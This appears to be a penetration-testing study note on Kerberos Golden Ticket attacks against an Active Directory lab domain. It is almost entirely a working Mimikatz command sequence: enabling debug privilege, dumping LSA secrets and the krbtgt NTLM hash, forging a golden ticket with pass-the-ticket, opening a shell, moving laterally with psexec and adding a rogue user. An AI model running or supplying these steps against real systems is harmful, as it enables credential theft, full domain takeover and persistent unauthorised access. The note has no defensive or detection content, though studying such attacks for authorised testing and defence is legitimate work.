# Golden Ticket Attacks

## What is a Golden Ticket

* gives us complete access to the whole domain
* can generate tickets with ticket granting ticket

## Golden Tickets Attack Overview with Mimikatz

### Step 1: Open Mimikatz and Always Start with the Same Command

```bash
privilege::debug
```

### Step 2: Dump the Hashes

```bash
lsadump::lsa
```

* to dump a specific user

```bash
lsadump::lsa /inject /name:krbtgt
```

### Step 3: Open Up a Notepad

* copy the SID of the domain \(this is on the domain line of Mimikatz and is the long string of nums\)
* sid example: S-1-5-21-301214212-3920777931-1277971883
* copy the NTLM of the krbtgt account \(or any other account\)

### Step 4: Generate Your Ticket

```bash
kerberos::golden /User:AdministratorOrFakeName /domain:marvel.local /sid:<sid> /krbtgt:<acc hash> /id:500 /ptt
```

### Step 5: Open Up a New Shell with the Session Created

```bash
misc::cmd
```

### Optional Step: Download Psexec into Victim and Get Another Shell

```bash
psexec.exe \\THEPUNISHER cmd.exe
```

### Optional Step: Create a User Account for Yourself

* you own the domain, so you can create an account

